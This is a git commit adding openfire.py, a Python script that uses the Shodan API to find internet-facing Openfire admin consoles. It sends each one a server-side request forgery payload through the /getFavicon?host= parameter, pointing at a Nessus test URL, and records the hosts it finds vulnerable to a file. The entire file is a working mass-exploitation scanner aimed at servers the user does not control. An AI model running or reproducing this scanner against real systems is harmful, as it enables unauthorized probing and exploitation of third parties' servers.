3639d05e0d6a4cfdba0dc1873474466c2ba4ba45
Robbie <txt3rob@gmail.com>
2020-08-04 18:44:36 +0100

    Create openfire.py

---
+++ openfire/openfire.py
@@ -0,0 +1,80 @@
+#!/usr/bin/env python
+#
+# openfire.py
+# Search SHODAN for openfire SSRF
+#
+# Author: random_robbie
+
+import shodan
+import sys
+import re
+import requests
+from time import sleep
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+# Configuration
+API_KEY = "YOURAPIKEY"
+SEARCH_FOR = 'title:"Openfire Admin Console"'
+FILE = "/getFavicon?host=rfi.nessus.org/rfi.txt?"
+session = requests.Session()
+
+def filter_result(str):
+	str.strip() #trim
+	str.lstrip() #ltrim
+	str.rstrip() #rtrim
+	return str
+
+def grab_file (IP,PORT,FILE):
+	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
+	try:
+		
+		URL = "http://"+IP+":"+PORT+""+FILE+""
+		if PORT == "443":
+			URL = "https://"+IP+":"+PORT+""+FILE+""
+		if PORT == "8443":
+			URL = "https://"+IP+":"+PORT+""+FILE+""	
+		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
+		response = session.get(URL, headers=headers, timeout=15, verify=False)
+		result = response.text
+		if "TmVzc3VzQ29kZUV4ZWNUZXN0" in response.text:
+			text_file = open("openfire.cfg", "a")
+			text_file.write(""+URL+"\n")
+			text_file.close()
+			print ("[*] openfire... Found [*]\n")
+			print (result)
+		else:
+			print ("[*] Not Vulnerable [*]\n ")
+	except KeyboardInterrupt:
+		print ("Ctrl-c pressed ...")
+		sys.exit(1)
+			
+	except Exception as e:
+		print (e)
+		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
+	
+
+
+
+	
+	
+try:
+        # Setup the api
+		api = shodan.Shodan(API_KEY)
+
+        # Perform the search
+		result = api.search(SEARCH_FOR,limit=None)
+
+        # Loop through the matches and print each IP
+		for service in result['matches']:
+				IP = service['ip_str']
+				PORT = str(service['port'])
+				CC = service['location']['country_name']
+				grab_file (IP,PORT,FILE)
+except KeyboardInterrupt:
+		print ("Ctrl-c pressed ...")
+		sys.exit(1)
+				
+except Exception as e:
+		print('Error: %s' % e)
+		sys.exit(1)
